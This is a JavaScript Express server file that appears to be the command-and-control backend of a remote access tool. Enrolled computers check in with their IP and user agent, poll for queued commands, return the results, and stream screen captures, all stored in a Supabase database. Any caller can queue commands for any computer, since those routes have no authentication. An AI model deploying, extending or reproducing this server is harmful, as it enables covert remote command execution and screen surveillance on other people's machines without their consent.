const express=require('express');
const path=require('path');
const app=express();
const PORT=process.env.PORT||3000;
const SB_URL='https://odocuexiouhmmkpwtuwk.supabase.co';
const SB_KEY=process.env.SB_SECRET_KEY||'';
const SB_PUB=process.env.SB_PUB_KEY||'';
const sh={'Content-Type':'application/json','apikey':SB_KEY,'Authorization':'Bearer '+SB_KEY};
const ph={'Content-Type':'application/json','apikey':SB_PUB,'Authorization':'Bearer '+SB_PUB,'Prefer':'return=minimal'};
app.use(express.json({limit:'50mb'}));
app.use(express.urlencoded({extended:true,limit:'50mb'}));

app.post('/ping',async(req,r)=>{
 try{
  const{computer}=req.body||{};
  const bodyData=JSON.stringify(req.body);
  await fetch(SB_URL+'/rest/v1/pings',{method:'POST',headers:ph,body:JSON.stringify({computer:computer||'',ip:req.ip||'unknown',body:bodyData,headers:{ua:req.headers['user-agent']||''}})});
  console.log('+ ping from '+computer);
  r.send('received');
 }catch(e){console.error(e.message);r.status(500).send('err');}
});

app.get('/cmd',async(req,r)=>{
 try{
  const c=req.query.computer;
  const res=await fetch(SB_URL+'/rest/v1/commands?computer=eq.'+encodeURIComponent(c)+'&status=eq.pending&order=id.asc&limit=1',{headers:sh});
  const rows=await res.json();
  if(rows.length){
   await fetch(SB_URL+'/rest/v1/commands?id=eq.'+rows[0].id,{method:'PATCH',headers:ph,body:JSON.stringify({status:'running'})});
   r.json(rows[0]);
  }else r.json(null);
 }catch(e){r.json(null);}
});

app.post('/cmd',async(req,r)=>{
 try{
  const{computer,type,payload}=req.body||{};
  if(!computer||!type){r.status(400).send('missing');return;}
  const res=await fetch(SB_URL+'/rest/v1/commands',{method:'POST',headers:{...ph,Prefer:'return=representation'},body:JSON.stringify({computer,type,payload:payload||'',status:'pending'})});
  const rows=await res.json();
  const id=rows&&rows.length?rows[0].id:0;
  console.log('+ cmd: '+type+' for '+computer+' #'+id);
  r.json({id});
 }catch(e){console.error(e.message);r.status(500).send('err');}
});

app.post('/cmd/:id/result',async(req,r)=>{
 try{
  let result=req.body.result||'';
  if(typeof result!=='string')result=JSON.stringify(result);
  await fetch(SB_URL+'/rest/v1/commands?id=eq.'+req.params.id,{method:'PATCH',headers:ph,body:JSON.stringify({status:'done',result:result})});
  console.log('+ result #'+req.params.id+' ('+result.length+' chars)');
  r.send('ok');
 }catch(e){console.error(e.message);r.status(500).send('err');}
});

const screens={};
app.post('/screen',(req,r)=>{
 try{
  const{computer,data}=req.body||{};
  if(computer&&data)screens[computer]={data,time:Date.now()};
  r.send('ok');
 }catch(e){r.status(500).send('err');}
});
app.get('/screen/:computer',(req,r)=>{
 const s=screens[req.params.computer];
 if(s&&(Date.now()-s.time)<5000)r.json({data:s.data});
 else r.json(null);
});

app.delete('/client/:name',async(req,r)=>{
 try{
  const name=decodeURIComponent(req.params.name);
  await fetch(SB_URL+'/rest/v1/pings?computer=eq.'+encodeURIComponent(name),{method:'DELETE',headers:ph});
  await fetch(SB_URL+'/rest/v1/commands?computer=eq.'+encodeURIComponent(name),{method:'DELETE',headers:ph});
  console.log('- removed '+name);
  r.send('ok');
 }catch(e){r.status(500).send('err');}
});

app.use(express.static(__dirname));
app.listen(PORT,()=>console.log(':'+PORT));
